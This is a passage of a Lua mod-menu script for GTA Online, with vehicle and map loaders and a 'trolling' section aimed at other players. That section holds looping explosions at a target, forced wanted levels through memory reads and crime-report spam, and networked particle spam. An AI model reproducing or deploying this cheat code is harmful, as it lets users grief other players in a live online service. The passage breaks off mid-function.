--[[
Prisuhm
Mirror
Lance
Bunny
Ayrapheyr
Nowiry
Ren
HoppaC4
Jayphen
--WE HAVE TAKEN OVER░ \☻/\☻/--
--░░░░░░░░░░░░░░░░░░░▌░ ▌--
--░░░░░░░░░░░░░░░░░░ / \░ / \--
--░░░░░░░░░░░░░░░░░███████ ]▄▄▄▄▄▄▄▄▄-----------●--
--░░░░░░░░░░░░▂▄▅█████████▅▄▃▂
--░░░░░░░░░░░I███████████████████].--
]]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
util.keep_running()
util.require_natives("natives-1660775568")
util.require_natives("natives-1651208000")
util.require_natives("natives-1627063482")
util.require_natives("natives-1640181023")

--------------------------------------------------------------------------------------

	splashes = menu.list(menu.my_root(), "Join Discord", {}, "", function(); end)


local aalib = require("aalib")
local PlaySound = aalib.play_sound
local SND_ASYNC<const> = 0x0001
local SND_FILENAME<const> = 0x00020000

resources_dir = filesystem.resources_dir() .. '\\curruptscript\\'
curruptscript_logo = directx.create_texture(resources_dir .. 'curruptscript_logo.png')

if not filesystem.is_dir(resources_dir) then
    notification("If Currupt Script is not installed properly. Some things will fail to load or break.")
end

if not SCRIPT_SILENT_START then
    logo_alpha = 0
    logo_alpha_incr = 0.02
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then 
                logo_alpha = 0	
            end
            util.yield()
    end
end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(curruptscript_logo, 0.15, 0.10, 0.5, 1.2, 0.5, 0.5, 0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 1 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
            end
            util.yield()
        end
    end)
    PlaySound(resources_dir .. "\\bruh.wav", SND_FILENAME | SND_ASYNC)
        end

menu.hyperlink(splashes, "Join The Discord", "https://discord.gg/CMBYPZr2Rc")
--------------------------------------------------------------------------------------
local script_dir <const> = filesystem.scripts_dir() .. "/lib/smilescript"

if not filesystem.exists(script_dir .. "/functions.lua") then
    error("Required file not found: /lib/smilescript/functions.lua")
end

require("lib.smilescript.functions")

--########################################################

  ---------------------| Variables |---------------------

--########################################################

local explosion_types <const> = {
    [0] = {"Grenade"},
    [1] = {"Grenade Launcher"},
    [2] = {"Stickybomb"},
    [3] = {"Molotov"},
    [4] = {"Rocket"},
    [5] = {"Tankshell"},
    [6] = {"Hi Octane"},
    [7] = {"Car"},
    [8] = {"Plane"},
    [9] = {"Petrol Pump"},
    [10] = {"Bike"},
    [11] = {"Steam"},
    [12] = {"Flame"},
    [13] = {"Water Hydrant"},
    [14] = {"Gas Canister"},
    [15] = {"Boat"},
    [16] = {"Ship"},
    [17] = {"Truck"},
    [18] = {"Bullet"},
    [19] = {"Smoke Grenade Launcher"},
    [20] = {"Smoke Grenade"},
    [21] = {"BZ Gas"},
    [22] = {"Flare"},
    [23] = {"Gas Canister"},
    [24] = {"Extinguisher"},
    [25] = {"Programmable AR"},
    [26] = {"Train"},
    [27] = {"Barrel"},
    [28] = {"Propane"},
    [29] = {"Blimp"},
    [30] = {"Flame Explode"},
    [31] = {"Tanker"},
    [32] = {"Plane Rocket"},
    [33] = {"Vehicle Bullet"},
    [34] = {"Gas Tank"},
    [36] = {"Railgun"},
    [37] = {"Blimp 2"},
    [38] = {"Firework"},
    [39] = {"Snowball"},
    [40] = {"Proximity Mine"},
    [41] = {"Valkyrie Cannon"},
    [42] = {"Air Defence"},
    [43] = {"Pipe Bomb"},
    [44] = {"Vehicle Mine"},
    [45] = {"Explosive Ammo"},
    [46] = {"APC Shell"},
    [47] = {"Cluster Bomb"},
    [48] = {"Gas Bomb"},
    [49] = {"Incendiary Bomb"},
    [50] = {"Standard Bomb"},
    [51] = {"Torpedo"},
    [52] = {"Underwater Torpedo"},
    [53] = {"Bombushka Cannon"},
    [54] = {"Cluster Bomb 2"},
    [55] = {"Hunter Barrage"},
    [56] = {"Hunter Cannon"},
    [57] = {"Rogue Cannon"},
    [58] = {"Underwater Mine"},
    [59] = {"Orbital Cannon"},
    [60] = {"Bomb Standard Wide"},
    [61] = {"Explosive Shotgun Ammo"},
    [62] = {"Oppressor MKII Cannon"},
    [63] = {"Mortar Kinetic"},
    [64] = {"Kinetic Mine"},
    [65] = {"EMP Mine"},
    [66] = {"Spike Mine"},
    [67] = {"Slick Mine"},
    [68] = {"Tar Mine"},
    [69] = {"Drone"},
    [70] = {"Up-n-Atomizer"},
    [71] = {"Buried Mine"},
    [72] = {"Missile"},
    [73] = {"RC Tank Rocket"},
    [74] = {"Water Bomb"},
    [75] = {"Water Bomb 2"},
    [78] = {"Flash Grenade"},
    [79] = {"Stun Grenade"},
    [81] = {"Large Missile"},
    [82] = {"Big Submarine"},
    [83] = {"EMP Launcher"}
}

local entity_types <const> = {
    [0] = {"Cone", name = "prop_mp_cone_01"},
    [1] = {"Pole", name = "prop_roadpole_01b"},
    [2] = {"Barrier", name = "prop_barrier_work06a"},
    [4] = {"Water Barrier", name = "prop_barrier_wat_03b"},
    [5] = {"Log", name = "prop_log_01"},
    [8] = {"Pipe", name = "prop_pipes_conc_01"},
    [9] = {"Pizza", name = "prop_pizza_box_02"},
    [10] = {"Burger", name = "prop_cs_burger_01"},
    [11] = {"Fries", name = "prop_food_chips"},
    [12] = {"Coke", name = "ng_proc_sodacan_01a"},
    [13] = {"Beer", name = "prop_amb_beer_bottle"},
    [14] = {"Glass", name = "prop_cs_shot_glass"},
    [15] = {"Coffee", name = "p_amb_cofeecup_01"},
    [16] = {"Panties", name = "p_cs_panties_03_s"},
    [17] = {"Dildo", name = "prop_cs_dildo_01"},
    [18] = {"Teddy Bear", name = "prop_mr_rasberryclean"},
    [19] = {"Fridge", name = "prop_fridge_01"},
    [20] = {"Washer", name = "prop_washer_02"},
    [21] = {"Television", name = "prop_tv_04"},
    [22] = {"Laptop", name = "bkr_prop_clubhouse_laptop_01a"},
    [23] = {"Tablet", name = "hei_prop_dlc_tablet"},
    [24] = {"Phone", name = "prop_phone_ing"},
    [25] = {"Money", name = "bkr_prop_money_wrapped_01"},
    [26] = {"Gold Bar", name = "ch_prop_gold_bar_01a"},
    [27] = {"Security Case", name = "prop_security_case_01"},
    [28] = {"Bomb", name = "w_smug_bomb_01"},
    [29] = {"Dummy", name = "prop_dummy_01"},
    [30] = {"Coffin", name = "prop_coffin_02b"},
    [31] = {"Death Body", name = "prop_water_corpse_02"},
    [32] = {"Umbrella", name = "p_amb_brolly_01_s"},
    [33] = {"Guitar", name = "prop_acc_guitar_01"},
    [34] = {"Ferris Wheel", name = "prop_ld_ferris_wheel"},
    [35] = {"Asteroid", name = "prop_asteroid_01"},
    [36] = {"Trash Bag", name = "p_binbag_01_s"},
    [37] = {"Bin", name = "prop_bin_08a"},
    [38] = {"Wheelchair", name = "prop_wheelchair_01"},
    [39] = {"Alien Egg", name = "prop_alien_egg_01"},
    [40] = {"Beachball", name = "prop_beachball_01"},
    [41] = {"Golfball", name = "prop_golf_ball"},
    [42] = {"Big Soccerball", name = "stt_prop_stunt_soccer_ball"}
}

local cage_types <const> = {
    [0] = {
        "Standard Cage",
        objects = {
            {
                name = "prop_gold_cont_01",
                offset = v3.new(0, 0, 0),
                rot = v3.new(0, 0, 0)
            }
        },
        max_distance = 2
    },
    [1] = {
        "Tall Cage",
        objects = {
            {
                name = "prop_rub_cage01a",
                offset = v3.new(0, 0, -1),
                rot = v3.new(0, 0, 0)
            },
            {
                name = "prop_rub_cage01a",
                offset = v3.new(0, 0, 1.2),
                rot = v3.new(-180, 0, 90)
            }
        },
        max_distance = 1.5
    },
    [2] = {
        "Box Cage",
        objects = {
            {
                name = "prop_ld_crate_01",
                offset = v3.new(0, 0, 0),
                rot = v3.new(-180, 90, 0)
            },
            {
                name = "prop_ld_crate_01",
                offset = v3.new(0, 0, 0),
                rot = v3.new(0, 90, 0)
            }
        },
        max_distance = 1.5
    },
    [3] = {
        "Pipe Cage",
        objects = {
            {
                name = "prop_pipes_conc_01",
                offset = v3.new(0, 0, 0),
                rot = v3.new(90, 0, 0)
            }
        },
        max_distance = 1.5
    },
    [4] = {
        "Stunt Tube Cage",
        objects = {
            {
                name = "stt_prop_stunt_tube_end",
                offset = v3.new(0, 0, 0),
                rot = v3.new(0, -90, 0)
            }
        },
        max_distance = 13
    }
}

local vehicle_types <const> = {
    [0] = {"Faggio", name = "faggio"},
    [1] = {"Go Kart", name = "veto"},
    [2] = {"Zhaba", name = "zhaba"},
    [3] = {"Buzzard", name = "buzzard2"},
    [4] = {"Insurgent", name = "insurgent"},
    [5] = {"Khanjali", name = "Khanjali"},
    [6] = {"Phantom Wedge", name = "phantom2"},
    [7] = {"Armored Boxville", name = "boxville5"},
    [8] = {"Bus", name = "bus"},
    [9] = {"Blimp", name = "blimp"},
}

local aura_vehicle_types <const> = {
    [0] = {"Explode"},
    [1] = {"Burn"},
    [2] = {"EMP"},
    [3] = {"Delete"}
}

local aura_ped_types <const> = {
    [0] = {"Explode"},
    [1] = {"Burn"},
    [2] = {"Taze"},
    [3] = {"Delete"}
}

local forcefield_types <const> = {
    [0] = {"Push"},
    [1] = {"Pull"}
}

local fake_pickup_types <const> = {
    [0] = {
        "Money Bag",
        objects = {
            "p_poly_bag_01_s"
        }
    },
    [1] = {
        "Action Figure",
        objects = {
            "vw_prop_vw_colle_alien",
            "vw_prop_vw_colle_beast",
            "vw_prop_vw_colle_imporage",
            "vw_prop_vw_colle_pogo",
            "vw_prop_vw_colle_prbubble",
            "vw_prop_vw_colle_rsrcomm",
            "vw_prop_vw_colle_rsrgeneric",
            "vw_prop_vw_colle_sasquatch"
        }
    },
    [2] = {
        "P's & Q's",
        objects = {
            "prop_choc_pq"
        }
    },
}

--########################################################

	local timer_divider = menu.divider(menu.my_root(), "Gang Shit")


	funfun = menu.list(menu.my_root(), "Fun Shit", {}, "", function(); end)

	menu.divider(funfun, "Fun Shit")


local local_lists <const> = {
    ["Self"] = menu.list(funfun, "Self"),
    ["World"] = menu.list(funfun, "World")
}

menu.divider(local_lists["Self"], "Self")
menu.divider(local_lists["World"], "World")

local local_sub_lists <const> = {
    ["Weapons"] = menu.list(local_lists["Self"], "Weapons"),
    ["Clean Area"] = menu.list(local_lists["World"], "Clean Area")
}


------------------------------
-- Weapons Menu
------------------------------

menu.divider(local_sub_lists["Weapons"], "Weapons")

menu.toggle(local_sub_lists["Weapons"], "Autoload Weapons", {"autoloadweapons"}, "Autoload all the weapons everytime you join a new session.", function(state)
    if state then
        players.on_join(function(player_id)
            local my_player_id <const> = players.user()

            if player_id == my_player_id then
                local all_weapons_command_ref <const> = menu.ref_by_path("Self>Weapons>Get Weapons>All Weapons")

                wait_session_transition()
                menu.trigger_command(all_weapons_command_ref)
                util.toast("Weapons loaded successfully. :)")
            end
        end)
    end
end)
------------------------------
-- Clear World Menu
------------------------------

local clear_world = {
    vehicles = true,
    peds = true,
    objects = true,
    pickups = true,
    ignore_player_vehicles = true
}

menu.divider(local_sub_lists["Clean Area"], "Clean Area")

menu.action(local_sub_lists["Clean Area"], "Clean Area", {"cleanarea"}, "Great hotkey as it does not disturb friends by choice.", function()
    local is_in_session <const> = NETWORK.NETWORK_IS_IN_SESSION()

    if is_in_session then
        local count = 0

        if clear_world.vehicles then
            local vehicles <const> = entities.get_all_vehicles_as_handles()

            for i, vehicle in pairs(vehicles) do
                local my_player_vehicle <const> = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
                local is_mission_entity <const> = ENTITY.IS_ENTITY_A_MISSION_ENTITY(vehicle)

                if not (my_player_vehicle == vehicle) then
                    if not (clear_world.ignore_player_vehicles and is_mission_entity) then
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, false)
                    else
                        pluto_continue
                    end

                    entities.delete_by_handle(vehicle)

                    count += 1

                    util.yield()
                end
            end
        end

        if clear_world.peds then
            local peds <const> = entities.get_all_peds_as_handles()

            for i, ped in pairs(peds) do
                local is_ped_player <const> = PED.IS_PED_A_PLAYER(ped)

                if not is_ped_player then
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, false)
                    entities.delete_by_handle(ped)

                    count += 1

                    util.yield()
                end
            end
        end

        if clear_world.objects then
            local objects <const> = entities.get_all_objects_as_handles()

            for i, object in pairs(objects) do
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
                entities.delete_by_handle(object)

                count += 1

                util.yield()
            end
        end

        if clear_world.pickups then
            local pickups <const> = entities.get_all_pickups_as_handles()

            for i, pickup in pairs(pickups) do
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(pickup, false, false)
                entities.delete_by_handle(pickup)

                count += 1

                util.yield()
            end
        end

        util.toast("World cleaned successfully, " .. count .. " entities removed. :)")
    else
        util.toast("This command is only available in GTA Online.")
    end
end)

menu.toggle(local_sub_lists["Clean Area"], "Clear Vehicles", {"clearvehicles"}, "", function(state)
    clear_world.vehicles = state
end, true)

menu.toggle(local_sub_lists["Clean Area"], "Clear Peds", {"clearpeds"}, "", function(state)
    clear_world.peds = state
end, true)

menu.toggle(local_sub_lists["Clean Area"], "Clear Objects", {"clearobjects"}, "", function(state)
clear_world.objects = state
end, true)

menu.toggle(local_sub_lists["Clean Area"], "Clear Pickups", {"clearpickups"}, "", function(state)
    clear_world.pickups = state
end, true)

menu.toggle(local_sub_lists["Clean Area"], "Ignore Player Vehicles", {"clearnoplayervehicles"}, "", function(state)
    clear_world.ignore_player_vehicles = state
end, true)

players.on_join(function(player_id)


	menu.divider(menu.player_root(player_id), "Currupt Script")

    local trolling_net_list <const> = menu.list(menu.player_root(player_id), "Extra Trolling")
    menu.divider(trolling_net_list, "Extra Trolling")

    ------------------------------
    -- Trolling Section
    ------------------------------

    local net_lists <const> = {
        ["Explosions"] = menu.list(trolling_net_list, "Explosions"),
        ["Particles"] = menu.list(trolling_net_list, "Particles"),
    }

    menu.slider(trolling_net_list, "Give Wanted Level", {"wantedlevel"}, "It may take a few seconds.", 1, 5, 1, 1, function(value)
            local player_ped <const> = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local player_info <const> = memory.read_long(entities.handle_to_pointer(player_ped) + 0x10C8)
            local wanted_level = memory.read_uint(player_info + 0x0888)
            local failed = false


            start_alarm(10000)

            while not (wanted_level >= value) and players.exists(player_id) do
                wanted_level = memory.read_uint(player_info + 0x0888)

                if get_alarm() then
                    failed = true
                    break
                end

                for i = 1, 46 do
                    PLAYER.REPORT_CRIME(player_id, i, value)
                end

                util.yield(10)
            end

            if failed then
                util.toast("Failed to increase wanted Level. :/")
            else
                util.toast("Wanted level increased successfully. :)")
            end
        end)

    ------------------------------
    -- Explosions Menu
    ------------------------------

    local explosion = {
        loop = false,
        delay = 100,
        shake = 1,
        blamed = false,
        audible = true,
        visible = true,
        damage = true
    }

    local function add_explosion()
        local my_player_ped <const> = players.user_ped()
        local player_pos <const> = players.get_position(player_id)

        if explosion.blamed then
            FIRE.ADD_OWNED_EXPLOSION(
                my_player_ped, player_pos.x, player_pos.y, player_pos.z,
                explosion.type, 1, explosion.audible, not explosion.visible, explosion.shake
            )
        else
            FIRE.ADD_EXPLOSION(
                player_pos.x, player_pos.y, player_pos.z,
                explosion.type, 1, explosion.audible, not explosion.visible, explosion.shake, not explosion.damage
            )
        end
    end

    menu.divider(net_lists["Explosions"], "Explosions")

    menu.action(net_lists["Explosions"], "Explode", {"ssexplode"}, "", function()
        add_explosion()
    end)

    menu.toggle(net_lists["Explosions"], "Explode Loop", {"explodeloop"}, "", function(state)
        explosion.loop = state

        while explosion.loop and players.exists(player_id) do
            add_explosion()
            util.yield(explosion.delay)
        end
    end)

    menu.list_select(net_lists["Explosions"], "Explosion Type", {"explosiontype"}, "", explosion_types, 0, function(value)
            explosion.type = value
    end)

    local explosion_other_net_list <const> = menu.list(net_lists["Explosions"], "Other Settings")
    menu.divider(explosion_other_net_list, "Other Settings")

    menu.slider(explosion_other_net_list, "Explosion Delay", {"explosiondelay"}, "", 50, 1000, 50, 50, function(value)
        explosion.delay = value
    end)

    menu.slider(explosion_other_net_list, "Explosion Shake", {"explosionshake"}, "", 0, 10, 1, 1, function(value)
        explosion.shake = value
    end)

    menu.toggle(explosion_other_net_list, "Explosion Blamed", {"explosionblamed"}, "", function(state)
        explosion.blamed = state
    end)

    menu.toggle(explosion_other_net_list, "Explosion Audible", {"explosionaudible"}, "", function(state)
        explosion.audible = state
    end, true)

    menu.toggle(explosion_other_net_list, "Explosion Visible", {"explosionvisible"}, "", function(state)
        explosion.visible = state
    end, true)

    menu.toggle(explosion_other_net_list, "Explosion Damage", {"explosiondamage"}, "If Explosion Blamed is on, turning this off won't have any effect.", function(state)
        explosion.damage = state
    end, true)

    ------------------------------
    -- Particles Menu
    ------------------------------

    local ptfx = {
        ids = {},
        amount = 1,
        size = 5,
        asset = "core",
        name = "exp_grd_grenade_smoke"
    }

    local function start_ptfx()
        local player_ped <const> = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)

        request_ptfx_asset(ptfx.asset)

        for i = 1, ptfx.amount do
            GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx.asset)

            local ptfx_id <const> = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(
                ptfx.name, player_ped,
                0, 0, 0,
                0, 0, 0,
                ptfx.size,
                false, false, false
            )

            table.insert(ptfx.ids, ptfx_id)
        end
    end

    local function remove_ptfx()
        for i, ptfx_id in pairs(ptfx.ids) do
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(ptfx_id, false)
        end
    end

    menu.divider(net_lists["Particles"], "Particles")

    menu.toggle(net_lists["Particles"], "Start PTFX", {"ptfx"}, "", function(state)
        if state then
            start_ptfx()

            while state do
                local is_player_dead <const> = PLAYER.IS_PLAYER_DEAD(player_id)

                if is_player_dead then
                    wait_player_revive(player_id)
                    remove_ptfx()
                    start_ptfx()
                else
                    util.yield(1000)
                end
            end
        else
            remove_ptfx()
        end
    end)

    menu.slider(net_lists["Particles"], "PTFX Amount", {"ptfxamount"}, "", 1, 250, 1, 1, function(value)
        ptfx.amount = value
    end)

    menu.slider(net_lists["Particles"], "PTFX Size", {"ptfxsize"}, "", 1, 10, 5, 1, function(value)
        ptfx.size = value
    end)

    local particles_other_net_list <const> = menu.list(net_lists["Particles"], "Other Settings")
    menu.divider(particles_other_net_list, "Other Settings")

    menu.text_input(particles_other_net_list, "PTFX Asset", {"ptfxasset"}, "", function(value)
        ptfx.offset = value
    end, "core")

    menu.text_input(particles_other_net_list, "PTFX Name", {"ptfxname"}, "",function(value)
        ptfx.name = value
    end, "exp_grd_grenade_smoke")

    menu.hyperlink(particles_other_net_list, "PTFX List", "https://github.com/DurtyFree/gta-v-data-dumps/blob/master/particleEffectsCompact.json#L270", "List of all PTFX and assets.")
end)

players.dispatch_on_join()


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--           __  ___   ______   _   __   __  __   ____     ____          
--          /  |/  /  / ____/  / | / /  / / / /  / __ \   / __ \ \ \ \ \   
--         / /|_/ /  / __/    /  |/ /  / / / /  / / / /  / / / /  _____ |
--        / /  / /  / /___   / /|  /  / /_/ /  / /_/ /  / /_/ _/ / /_/
--       /_/  /_/  /_____/  /_/ |_/   \____/   \____/   \____/            

slaxdom = require("lib/slaxdom")
slaxml = require("lib/slaxml")
lunajson = require("lunajson")
local iniparser = require("iniparser")
local fail_text = "This file failed to load properly and may be of an unsupported format. Please submit a bug report on Discord and attach the vehicle you just tried loading."
local instruction_text = "\nHold shift and ctrl while clicking an option to delete this vehicle from your directory.\nHold space and click an option to add to your favorites."

	menyoos = menu.list(menu.my_root(), "Menyoo", {}, "", function(); end)

function request_anim_dict(dict)
    request_time = os.time()
    if not STREAMING.DOES_ANIM_DICT_EXIST(dict) then
        return
    end
    STREAMING.REQUEST_ANIM_DICT(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end


function hasValue( tbl, str )
    local f = false
    for i = 1, #tbl do
        if type( tbl[i] ) == "table" then
            f = hasValue( tbl[i], str )  --  return value from recursion
            if f then break end  --  if it returned true, break out of loop
        elseif tbl[i] == str then
            return true
        end
    end
    return f
end


function split_str(inputstr, sep)
    if sep == nil then
            sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            table.insert(t, str)
    end
    return t
end

function to_boolean(text)
    if text == 'true' or text == "1" then
        return true
    end
    return false
end

function get_element_text(el)
    local pieces = {}
    for _,n in ipairs(el.kids) do
      if n.type=='element' then pieces[#pieces+1] = get_element_text(n)
      elseif n.type=='text' then pieces[#pieces+1] = n.value
      end
    end
    return table.concat(pieces)
end


store_dir = filesystem.store_dir() .. '\\LanceSpooner\\'


vehicles_dir = store_dir .. '\\vehicles\\'
if not filesystem.is_dir(vehicles_dir) then
    filesystem.mkdir(vehicles_dir)
end


maps_dir = store_dir .. '\\maps\\'
if not filesystem.is_dir(maps_dir) then
    filesystem.mkdir(maps_dir)
end



function parse_xml(path)
    -- does this path even exist?
    if not filesystem.exists(path) then
        util.toast("Error parsing XML. File doesn\'t exist?")
        return
    end
    -- break file into string
    local xml = io.open(path):read('*all')
    -- dom that shit ;)
    local dom = slaxdom:dom(xml, {stripWhitespace=true})
    -- return our dominant superior ;)
    return dom
end

all_vehicles = {}
all_maps = {}

favorite_vehicles = {}
favorite_maps = {}

function search_vehicle(query)
    local finds = {}
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        local v_name = path:gsub(vehicles_dir, '')
        if string.endswith(v_name, '.ini') or string.endswith(v_name, '.xml') or string.endswith(v_name, '.json') then
            if string.contains(string.lower(v_name), query) then
                finds[#finds + 1] = v_name
            end
        end
    end
    return finds
end

function search_map(query)
    local finds = {}
    for i, path in ipairs(filesystem.list_files(maps_dir)) do
        local m_name = path:gsub(maps_dir, '')
        if string.endswith(m_name, '.xml')then
            if string.contains(string.lower(m_name), query) then
                finds[#finds + 1] = m_name
            end
        end
    end
    return finds
end

local v_search_results_action 
local m_search_results_action

function get_file_type(file_path)
    local _, _, ext = string.match(file_path, "(.-)([^\\/]-%.?)[.]([^%.\\/]*)$")
    return ext
end

	menu.divider(menyoos, "Vehicles")

menu.action(menyoos, "Search vehicle", {"lssearchv"}, "", function(click_type)
    menu.show_command_box("lssearchv" .. " ")
    end, function(on_command)
        local results = search_vehicle(on_command)
        if #results == 0 then 
            util.toast("No results :(")
        else
            menu.set_list_action_options(v_search_results_action, results)
            menu.trigger_commands("lsvsearchresults")
        end
end)

function load_vehicle(path)
    local ext = get_file_type(path) 
    pluto_switch ext do 
        case "xml": 
            menyoo_load_vehicle(path)
            break 
        case "ini":
            ini_load_vehicle(path:gsub(vehicles_dir, ''))
            break 
        case "json":
            json_load_vehicle(path)
            break 
        pluto_default:
            util.toast("This is not a supported file.")
    end
end

function load_map(path)
    local ext = get_file_type(path) 
    pluto_switch ext do 
        case "xml": 
            menyoo_load_map(path)
            break
        pluto_default:
            util.toast("This is not a supported file.")
    end
end

function favorite_vehicle(file_name)
    local full_path = vehicles_dir .. '\\' .. file_name
    local half_path = vehicles_dir .. '\\'
    os.rename(full_path, half_path .. '[F] ' .. file_name)
    util.toast(file_name .. " added to favorites!")
    get_all_vehicles_in_dir()
end

function favorite_map(file_name)
    local full_path = maps_dir .. '\\' .. file_name
    local half_path = maps_dir .. '\\'
    os.rename(full_path, half_path .. '[F] ' .. file_name)
    util.toast(file_name .. " added to favorites!")
    get_all_maps_in_dir()
end

local load_vehicle_action = menu.list_action(menyoos, "Load vehicle", {}, "Load a vehicle. " .. instruction_text, all_vehicles, function(index, value)
    local path = vehicles_dir .. '\\' .. value
    if util.is_key_down(0x10) and util.is_key_down(0x11) then
        os.remove(path)
        util.toast(value .. " deleted! :)")
        get_all_vehicles_in_dir()
    elseif util.is_key_down(0x20) then 
        favorite_vehicle(value)
    else
        load_vehicle(vehicles_dir .. '\\' .. value)
    end
end)

loaded_vehicles_root = menu.list(menyoos, "Currently loaded vehicles", {"lancespoonerloadedvehicles"}, "Vehicles you have spawned")

	menu.divider(menyoos, "Maps")

menu.action(menyoos, "Search map", {"lssearchmap"}, "", function(click_type)
    menu.show_command_box("lssearchmap" .. " ")
    end, function(on_command)
        local results = search_map(on_command)
        if #results == 0 then 
            util.toast("No results :(")
        else
            menu.set_list_action_options(m_search_results_action, results)
            menu.trigger_commands("lsmsearchresults")
        end
end)

local load_map_action = menu.list_action(menyoos, "Load map", {}, "Load a map. " .. instruction_text, all_maps, function(index, value)
    local path = maps_dir .. '\\' .. value
    if util.is_key_down(0x10) and util.is_key_down(0x11) then
        os.remove(path)
        util.toast(value .. " deleted! :)")
        get_all_maps_in_dir()
    elseif util.is_key_down(0x20) then 
        favorite_map(value)
    else
        load_map(path)
    end
end)
loaded_maps_root = menu.list(menyoos, "Currently loaded maps", {"lancespoonerloadedmaps"}, "Maps you have loaded")

	menu.divider(menyoos, "Favorites")

local load_favorite_vehicle_action = menu.list_action(menyoos, "Favorite vehicles", {}, "Load a vehicle.", favorite_vehicles, function(index, value)
    load_vehicle(vehicles_dir .. '\\' .. value)
end)

local load_favorite_map_action = menu.list_action(menyoos, "Favorite maps", {}, "Load a map.", favorite_maps, function(index, value)
    load_map(maps_dir .. '\\' .. value)
end)


function get_all_vehicles_in_dir()
    local temp_vehicles = {}
    local temp_favorite_vehicles = {}
    local temp_favorite_maps = {}
    local supported_formats = {'.xml', '.ini', '.json'}
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        for _, fmt in pairs(supported_formats) do 
            if string.match(path:gsub(vehicles_dir, ''), fmt) then
                temp_vehicles[#temp_vehicles + 1] = path:gsub(vehicles_dir, '')
                if string.startswith(path:gsub(vehicles_dir, ''), '[F]') then 
                    temp_favorite_vehicles[#temp_favorite_vehicles+1] = path:gsub(vehicles_dir, '')
                end
            end
        end
    end

    all_vehicles = temp_vehicles
    favorite_vehicles = temp_favorite_vehicles
    menu.set_list_action_options(load_vehicle_action, all_vehicles)
    menu.set_list_action_options(load_favorite_vehicle_action, favorite_vehicles)
end

function get_all_maps_in_dir()
    local temp_maps = {}
    local temp_favorite_maps = {}
    for i, path in ipairs(filesystem.list_files(maps_dir)) do
        if string.match(path:gsub(maps_dir, ''), '.xml') then
            temp_maps[#temp_maps + 1] = path:gsub(maps_dir, '')
            if string.startswith(path:gsub(maps_dir, ''), '[F]') then 
                temp_favorite_maps[#temp_favorite_maps+1] = path:gsub(maps_dir, '')
            end
        end
    end


    all_maps = temp_maps
    favorite_maps = temp_favorite_maps
    menu.set_list_action_options(load_map_action, all_maps)
    menu.set_list_action_options(load_favorite_map_action, favorite_maps)
end

get_all_vehicles_in_dir()
get_all_maps_in_dir()

util.create_thread(function()
    while true do
        get_all_vehicles_in_dir()
        get_all_maps_in_dir()
        util.yield(5000)
    end
end)

	menu.divider(menyoos, "Search Results")

v_search_results = {}
v_search_results_action = menu.list_action(menyoos, "Vehicle search results", {"lsvsearchresults"}, "", v_search_results, function(index, value)
    local path = vehicles_dir .. '\\' .. value
    load_vehicle(path)
end)

m_search_results = {}
m_search_results_action = menu.list_action(menyoos, "Map search results", {"lsmsearchresults"}, "", m_search_results, function(index, value)
    local path = maps_dir .. '\\' .. value
    menyoo_load_map(path)
end)

function menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
    local ped_data = {}
    isped = true
    entity = ped
    menyoo_preprocess_entity(ped, att_data)
    if #entity_initial_handles > 0 then
        entity_initial_handles[att_data['InitialHandle']] = ped
    end
    for a,b in pairs(att_data['PedProperties'].kids) do
        local name = b.name
        local val = get_element_text(b)
        if name == 'PedProps' or name == 'PedComps' or name == 'TaskSequence' then
            ped_data[name] = b 
        else
            ped_data[name] = val
        end
    end
    local task_data = {}
    if att_data['TaskSequence'] ~= nil then
        for a,b in pairs(att_data['TaskSequence'].kids) do
            for c,d in pairs(b.kids) do
                task_data[d.name] = get_element_text(d)
            end
        end
    end
    local props = menyoo_build_properties_table(ped_data['PedProps'].kids)
    for k,v in pairs(props) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_PROP_INDEX(ped, k, tonumber(v[1]), tonumber(v[2]), true)
    end
    local comps = menyoo_build_properties_table(ped_data['PedComps'].kids)
    for k,v in pairs(comps) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_COMPONENT_VARIATION(ped, k, tonumber(v[1]), tonumber(v[2]), tonumber(v[2]))
    end
    PED.SET_PED_CAN_RAGDOLL(ped, to_boolean(ped_data['CanRagdoll']))
    PED.SET_PED_ARMOUR(ped, ped_data['Armour'])
    WEAPON.GIVE_WEAPON_TO_PED(ped, ped_data['CurrentWeapon'], 999, false, true)
    -- skipping over relationship groups, fuck that shit, seriously
    -- anim shit
    if task_data['AnimDict'] ~= nil then
        request_anim_dict(task_data['AnimDict'])
        local duration = tonumber(task_data['Duration'])
        local flag = tonumber(task_data['Flag'])
        local speed = tonumber(task_data['Speed'])
        TASK.TASK_PLAY_ANIM(ped, task_data['AnimDict'], task_data['AnimName'], 8.0, 8.0, duration, flag, speed, false, false, false)
    elseif ped_data['AnimDict'] ~= nil then
